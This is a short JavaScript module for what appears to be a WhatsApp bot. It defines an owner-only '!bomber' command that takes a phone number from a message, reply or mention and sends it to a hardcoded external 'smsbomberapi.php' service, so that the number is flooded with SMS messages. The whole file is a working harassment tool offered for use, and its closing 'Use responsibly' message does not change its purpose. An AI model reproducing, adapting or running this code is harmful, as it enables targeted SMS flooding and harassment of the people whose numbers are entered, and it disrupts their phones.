const { cmd } = require('../command');

// Hardcoded API (Aap yahin apna API daal do)
const SMS_API = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";

cmd({
    pattern: "bomber",
    react: "👽",
    desc: "Trigger SMS bombing (Owner Only)",
    category: "main",
    filename: __filename
}, 
async (conn, mek, m, { from, isOwner }) => {
    try {
        if (!isOwner) {
            return conn.sendMessage(from, { text: "❌ Only bot owner can use this command!" }, { quoted: mek });
        }

        // Extract number (command/reply/mention se)
        const number = m.quoted?.sender || m.mentionedJid?.[0] || m.text.split(' ')[1];
        if (!number) {
            return conn.sendMessage(from, { text: "Usage: !bomber 923015xxxx" }, { quoted: mek });
        }

        // Clean number (remove WhatsApp suffix if any)
        const cleanNumber = number.replace('@s.whatsapp.net', '');

        // Call API
        const apiUrl = `${SMS_API}${cleanNumber}`;
        const response = await fetch(apiUrl);

        if (response.ok) {
            conn.sendMessage(from, { 
                text: `✅SMS bombing started on *${cleanNumber}*!\n\n_Note: Use responsibly!_` 
            }, { quoted: mek });
        } else {
            conn.sendMessage(from, { 
                text: `❌ API failed! Status: ${response.status}` 
            }, { quoted: mek });
        }
    } catch (error) {
        console.error(error);
        conn.sendMessage(from, { 
            text: `⚠️ Error: ${error.message}` 
        }, { quoted: mek });
    }
});
